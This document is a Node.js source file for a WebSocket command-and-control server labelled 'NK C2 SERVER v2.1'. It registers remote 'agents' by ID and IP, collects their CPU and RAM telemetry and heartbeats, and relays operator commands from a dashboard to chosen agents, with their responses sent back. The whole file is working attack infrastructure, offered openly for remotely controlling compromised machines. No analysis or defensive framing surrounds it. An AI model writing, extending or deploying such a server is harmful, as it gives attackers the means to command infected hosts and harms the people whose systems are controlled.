// FILE: server.js
// NK C2 SERVER v2.1 - Enhanced Stability & Ping Handling
console.log("Starting NK C2 Server...");

const express = require('express');
const { WebSocketServer } = require('ws');
const uuid = require('uuid');

const PORT = process.env.PORT || 3000;
const app = express();

app.get('/', (req, res) => res.status(200).send('NK C2 OPERATIONAL'));

const server = app.listen(PORT, () => console.log(`C2 Listening on ${PORT}`));
const wss = new WebSocketServer({ server });

const agents = new Map(); 
const controllers = new Set(); 

// Keep-Alive Heartbeat (Accelerated to 10s for reliability)
const interval = setInterval(() => {
  wss.clients.forEach((ws) => {
    if (ws.isAlive === false) return ws.terminate();
    ws.isAlive = false;
    ws.ping();
  });
}, 10000);

wss.on('close', () => clearInterval(interval));

wss.on('connection', (ws, req) => {
  ws.isAlive = true;
  ws.on('pong', () => ws.isAlive = true);

  const url = new URL(req.url, `http://${req.headers.host}`);
  const isController = url.searchParams.get('role') === 'dashboard';

  if (isController) {
    console.log('NK DASHBOARD CONNECTED');
    controllers.add(ws);
    
    // Send full list on connect
    const agentList = Array.from(agents.values()).map(a => a.data);
    ws.send(JSON.stringify({ type: 'FULL_SYNC', payload: agentList }));
    
    ws.on('message', (msg) => {
      try {
        const data = JSON.parse(msg);
        
        // Handle explicit Keep-Alive Pings from Dashboard
        if (data.type === 'PING') return;

        if (data.action && data.agent_id && agents.has(data.agent_id)) {
          const agentWs = agents.get(data.agent_id).socket;
          if(agentWs.readyState === 1) {
             console.log(`Command -> ${data.agent_id}: ${data.action}`);
             agentWs.send(JSON.stringify(data));
          } else {
             ws.send(JSON.stringify({
               type: 'CMD_RESPONSE',
               payload: { agent_id: data.agent_id, status: 'offline', output: { error: 'Socket closed' } }
             }));
          }
        }
      } catch (e) { console.error("Dash Msg Error:", e); }
    });
    
    ws.on('close', () => controllers.delete(ws));
  } 
  else {
    // AGENT CONNECTION
    const agentIdHeader = req.headers['agent-id'];
    if (!agentIdHeader) { ws.close(); return; }

    const agentId = Array.isArray(agentIdHeader) ? agentIdHeader[0] : agentIdHeader;
    const agentIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const initialData = { 
      id: agentId, ip: agentIp, status: 'IDLE', 
      cpuUsage: 0, ramUsage: 0, lastHeartbeat: new Date() 
    };
    
    agents.set(agentId, { socket: ws, data: initialData });
    console.log(`Agent Up: ${agentId}`);
    broadcast({ type: 'AGENT_CONNECTED', payload: initialData });

    ws.on('message', (msg) => {
      try {
        const message = JSON.parse(msg);
        
        // Forward EVERYTHING to dashboards (Heartbeats, Status Updates, Responses)
        if (message.type === 'HEARTBEAT') {
           const agentRecord = agents.get(agentId);
           if (agentRecord) {
             agentRecord.data = { ...agentRecord.data, ...message.payload, lastHeartbeat: new Date() };
             broadcast({ type: 'TELEMETRY', payload: agentRecord.data });
           }
        } else {
           // CMD_UPDATE, CMD_RESPONSE, etc.
           broadcast(message);
        }
      } catch (e) { console.error("Agent Msg Error:", e); }
    });

    ws.on('close', () => {
      console.log(`Agent Down: ${agentId}`);
      agents.delete(agentId);
      broadcast({ type: 'AGENT_DISCONNECTED', payload: { id: agentId } });
    });
  }
});

function broadcast(msg) {
  controllers.forEach(c => {
    if (c.readyState === 1) c.send(JSON.stringify(msg));
  });
}
